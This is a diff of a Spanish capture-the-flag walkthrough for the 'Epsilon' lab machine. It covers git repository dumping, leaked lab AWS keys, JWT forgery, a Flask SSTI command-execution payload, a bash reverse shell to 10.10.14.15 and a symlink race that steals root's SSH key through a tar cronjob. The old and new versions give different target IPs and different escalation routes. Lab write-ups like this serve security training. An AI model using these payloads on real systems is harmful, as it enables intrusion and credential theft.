@@ -1,141 +1,121 @@
 <h2>Overview</h2>
-<p>En esta máquina "Epsilon", comenzamos con un escaneo completo de puertos para identificar servicios activos. Encontramos un servidor web con un repositorio Git expuesto y un servidor Werkzeug de Python. Explotamos el repositorio Git para obtener credenciales sensibles y la clave secreta de JWT, que nos permitió generar un token para acceder a la ruta /home. Finalmente, localizamos una clave privada SSH filtrada para escalar privilegios y obtener acceso completo al sistema.</p>
+<p>Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Las credenciales de AWS se filtran en los commits de Git, permitiendo descargar el código de la función Lambda. La clave secreta en el código fuente se puede usar para falsificar una cookie y acceder a la aplicación web. Finalmente, se escala a root abusando de un cronjob que ejecuta tar con enlaces simbólicos.</p>
 
 <h2>Key steps</h2>
 <ol>
-  <li>Reconocimiento y escaneo de puertos con <code>nmap</code>.</li>
-  <li>Explotación del repositorio Git para obtener secretos y credenciales.</li>
-  <li>Generación de token JWT para acceder a /home.</li>
-  <li>Escalada de privilegios usando clave SSH filtrada.</li>
+  <li>Escaneo y enumeración de puertos con <code>nmap</code>.</li>
+  <li>Enumeración de la aplicación web (HTTP) y volcado del repositorio Git.</li>
+  <li>Análisis de los scripts Python y extracción de credenciales de AWS Lambda.</li>
+  <li>Generación de token JWT usando la clave secreta para acceso administrativo.</li>
+  <li>Explotación de SSTI en la aplicación Flask para obtener shell.</li>
+  <li>Escalada de privilegios usando cronjob con tar y enlaces simbólicos.</li>
 </ol>
 
-<h3>1. Reconocimiento de la Máquina</h3>
-<pre><code>sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts
-Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-10 18:20 -0500
-Initiating SYN Stealth Scan at 18:20
-Scanning 10.10.11.134 [65535 ports]
-Discovered open port 80/tcp on 10.10.11.134
-Discovered open port 22/tcp on 10.10.11.134
-Discovered open port 5000/tcp on 10.10.11.134
-Completed SYN Stealth Scan at 18:20, 14.31s elapsed (65535 total ports)
-Nmap scan report for 10.10.11.134
-Host is up, received user-set (0.13s latency).
-Scanned at 2025-09-10 18:20:11 -05 for 14s
-Not shown: 65532 closed tcp ports (reset)
-PORT     STATE SERVICE REASON
-22/tcp   open  ssh     syn-ack ttl 63
-80/tcp   open  http    syn-ack ttl 63
-5000/tcp open  upnp    syn-ack ttl 63
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
-           Raw packets sent: 70312 (3.094MB) | Rcvd: 70304 (2.812MB)</code></pre>
+<h3>1. Enumeración</h3>
+<pre><code>nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 10.10.10.134</code></pre>
 
-<pre><code>nmap -p22,80,5000 -sCV 10.10.11.134 -oN infoPorts
-Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-10 18:21 -0500
-Nmap scan report for 10.10.11.134
-Host is up (0.18s latency).
+<p>Puertos abiertos:</p>
+<pre><code>22/tcp   open  ssh
+80/tcp   open  http
+5000/tcp open  http</code></pre>
 
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-80/tcp   open  http    Apache httpd 2.4.41
-|_http-title: 403 Forbidden
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-| http-git: 
-|   10.10.11.134:80/.git/
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
-|_    Last commit message: Updating Tracking API
-5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
-|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
-|_http-title: Costume Shop
-Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<h3>2. Enumeración HTTP</h3>
+<p>Volcamos el repositorio Git expuesto en / con githack/gitdumper:</p>
+<pre><code>./gitdumper.sh http://10.10.10.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds</code></pre>
+<p>Archivos encontrados: <code>server.py</code> y <code>track_api_CR_148.py</code></p>
 
-<h3>2. Explotación del Repositorio Git</h3>
-<pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo
+<h4>track_api_CR_148.py (commit relevante)</h4>
+<pre><code>aws_access_key_id='AQLA5M37BDN6FJP76TDC'
+aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'
+region_name='us-east-1'
+endpoint_url='http://cloud.epsilon.htb'</code></pre>
 
-git log -p > ../commits_diff.txt
+<p>Esta información nos permite interactuar con el endpoint de AWS Lambda.</p>
 
-# Fragmento encontrado en commits_diff.txt
-commit c622771686bd74c16ece91193d29f85b5f9ffa91
-Author: root &lt;root@epsilon.htb&gt;
-Date:   Wed Nov 17 17:41:07 2021 +0000
-
-    Fixed Typo
-
-diff --git a/track_api_CR_148.py b/track_api_CR_148.py
-index 545f6fe..8d3b52e 100644
---- a/track_api_CR_148.py
-+++ b/track_api_CR_148.py
-@@ -8,8 +8,8 @@ session = Session(
-     aws_access_key_id='&lt;aws_access_key_id&gt;',
-     aws_secret_access_key='&lt;aws_secret_access_key&gt;',
-     region_name='us-east-1',
--    endpoint_url='http://cloud.epsilong.htb')
--aws_lambda = session.client('lambda')    
-+    endpoint_url='http://cloud.epsilon.htb')
-+aws_lambda = session.client('lambda')</code></pre>
-
-<pre><code>cat server.py
-#!/usr/bin/python3
-
-import jwt
-from flask import *
-
-app = Flask(__name__)
-secret = 'l33th4x0r'
-
-def verify_jwt(token,key):
-    try:
-        username=jwt.decode(token,key,algorithms=['HS256',])['username']
-        if username:
-            return True
-        else:
-            return False
-    except:
-        return False
+<h4>server.py (commit relevante)</h4>
+<pre><code>secret = '&lt;secret_key&gt;'
 
 @app.route("/", methods=["GET","POST"])
 def index():
     if request.method=="POST":
         if request.form['username']=="admin" and request.form['password']=="admin":
             res = make_response()
-            username=request.form['username']
             token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
             res.set_cookie("auth",token)
             res.headers['location']='/home'
-            return res,302
-        else:
-            return render_template('index.html')
-    else:
-        return render_template('index.html')
+            return res,302</code></pre>
 
-@app.route("/home")
-def home():
-    if verify_jwt(request.cookies.get('auth'),secret):
-        return render_template('home.html')
-    else:
-        return redirect('/',code=302)</code></pre>
+<h3>3. Enumeración AWS Lambda</h3>
+<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions
+{
+    "Functions": [
+        {
+            "FunctionName": "costume_shop_v1",
+            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
+            "Runtime": "python3.7",
+            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
+            "Handler": "my-function.handler",
+            "CodeSize": 478,
+            "Description": "",
+            "Timeout": 3,
+            "LastModified": "2021-11-21T14:38:10.553+0000",
+            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
+            "Version": "$LATEST",
+            "VpcConfig": {},
+            "TracingConfig": {"Mode": "PassThrough"},
+            "RevisionId": "2c84c0b6-df38-441d-a88d-ff51679c32e6",
+            "State": "Active",
+            "LastUpdateStatus": "Successful",
+            "PackageType": "Zip"
+        }
+    ]
+}</code></pre>
 
+<p>Se descarga el código de la función Lambda y se obtiene el <code>secret</code> usado para firmar JWT.</p>
+
+<h3>4. Explotación y acceso inicial</h3>
+<p>Generamos un token JWT de administrador usando PyJWT y lo colocamos en la cookie <code>auth</code>:</p>
 <pre><code>import jwt
-secret = 'l33th4x0r'
+secret = 'VALOR_EXTRAIDO_DEL_LAMBDA'
 token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
 print(token)</code></pre>
 
-<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
+<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home</code></pre>
 
-<h3>3. Escalada de Privilegios y Acceso Final</h3>
-<pre><code>chmod 600 id_rsa
+<p>Se obtiene acceso administrativo a la aplicación web.</p>
 
-ssh -i id_rsa epsilon@10.10.11.134
+<h4>Explotación SSTI</h4>
+<p>En la ruta /order se encontró vulnerabilidad SSTI usando Flask:</p>
+<pre><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></pre>
 
-sudo -l</code></pre>
+<p>Se genera reverse shell:</p>
+<pre><code>bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"</code></pre>
 
-<p>Con estos pasos, logramos obtener acceso completo a la máquina Epsilon como usuario y localizar la flag de root. La clave fue identificar el repositorio Git expuesto y extraer secretos del historial de commits, generando un token JWT válido y utilizando la clave SSH filtrada para escalar privilegios.</p>
+<h3>5. Escalada de privilegios</h3>
+<p>Se utiliza <code>pspy</code> para enumerar cronjobs y detectar backups periódicos que usan tar:</p>
+<pre><code>#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*</code></pre>
+
+<p>Se crea un enlace simbólico de <code>id_rsa</code> de root a <code>/opt/backups/checksum</code> para capturar la clave durante el backup:</p>
+<pre><code>#!/bin/bash
+while true; do 
+    if [ -e /opt/backups/checksum ]; then 
+        rm -f /opt/backups/checksum
+        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
+        break
+    fi; 
+done</code></pre>
+
+<p>Una vez obtenido <code>id_rsa</code>, se conecta vía SSH como root:</p>
+<pre><code>ssh -i id_rsa root@10.10.10.134</code></pre>
+
+<p>Con esto se completa la resolución de la máquina Epsilon.</p>
 
